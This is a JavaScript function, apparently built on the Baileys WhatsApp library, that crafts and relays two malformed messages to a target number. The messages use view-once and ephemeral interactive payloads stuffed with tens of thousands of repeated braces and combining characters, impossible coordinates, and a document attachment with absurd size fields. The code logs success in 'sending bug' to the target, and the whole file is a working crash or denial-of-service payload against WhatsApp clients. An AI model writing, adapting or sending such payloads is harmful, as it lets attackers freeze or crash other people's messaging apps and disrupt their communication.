async function VerloadXCallFcV4(target) {
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              expiration: 1,
              ephemeralSettingTimestamp: 1,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              entryPointConversionDelaySeconds: 1,
              disappearingMode: {
                initiatorDeviceJid: target,
                initiator: "INITIATED_BY_OTHER",
                trigger: "UNKNOWN_GROUPS"
              },
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              questionMessage: {
                paymentInviteMessage: {
                  serviceType: 1,
                  expiryTimestamp: null
                }
              },
              externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true
              }
            },
            body: {
              text: "Hi I'm Vaxzy!!" + "ោ៝".repeat(10000),
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(20000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson:
                     ""
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson:
                     ""
                }
              ]
            }
          }
        }
      }
    },
    {}
  );
    
  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
    
    const msg2 = await generateWAMessageFromContent(
        target,
        {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "",
                  hasMediaAttachment: false,
                  locationMessage: {
                    degreesLatitude: 999999999,
                    degreesLongitude: -999999999,
                    name: '{'.repeat(100000),
                    address: '{'.repeat(100000),
                  },
                },
                contextInfo: {
                  participant: "0@s.whatsapp.net",
                  remoteJid: "X",
                  mentionedJid: ["0@s.whatsapp.net"]
                },
                body: {
                  text: "Hi I'm Vaxzy!!",
                },
                nativeFlowMessage: {
                  messageParamsJson: '{'.repeat(100000),
                },
              },
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.slideshow",
                fileSha256: Buffer.from("ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=", "base64"),
                fileLength: "974197419741",
                pageCount: "974197419741",
                mediaKey: Buffer.from("5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=", "base64"),
                fileName: "𝄽‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌".repeat(70),
                fileEncSha256: Buffer.from("pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=", "base64"),
                directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1715880173"
              }
            }
          }
        },
        {}
      );
      await sock.relayMessage(target, msg2.message, {
        participant: { jid: target },
        messageId: msg2.key.id
      });
      console.log(chalk.red(`Succes Sending Bug XCallDocuSql To ${target}`));
      }